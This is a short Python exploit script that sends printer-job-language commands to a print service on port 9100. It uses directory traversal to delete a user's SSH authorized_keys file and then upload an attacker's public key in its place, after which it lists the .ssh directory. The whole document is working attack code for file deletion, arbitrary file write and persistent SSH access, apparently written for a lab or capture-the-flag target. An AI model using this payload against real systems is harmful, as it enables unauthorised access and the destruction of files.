#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
N = len(KEY)
PATH = "../.ssh/authorized_keys"

cmds = [
    f'@PJL FSDELETE NAME="{PATH}"\r\n',
    f'@PJL FSUPLOAD NAME="{PATH}" OFFSET=0 SIZE={N}\r\n',
    f'@PJL FSUPLOAD OFFSET=0 SIZE={N} NAME="{PATH}"\r\n',
    f'@PJL FSUPLOAD NAME="{PATH}" SIZE={N} OFFSET=0\r\n',
]
for c in cmds:
    s = socket.socket()
    s.settimeout(6)
    s.connect(("127.0.0.1", 9100))
    payload = c.encode() + (KEY if "FSUPLOAD" in c else b"")
    s.sendall(payload)
    try:
        r = s.recv(512)
    except socket.timeout:
        r = b"T"
    s.close()
    print(c.strip(), "->", r[:100])
s = socket.socket()
s.settimeout(4)
s.connect(("127.0.0.1", 9100))
s.sendall(b'@PJL FSQUERY NAME="../.ssh"\r\n')
print("Q", s.recv(1024))
s.close()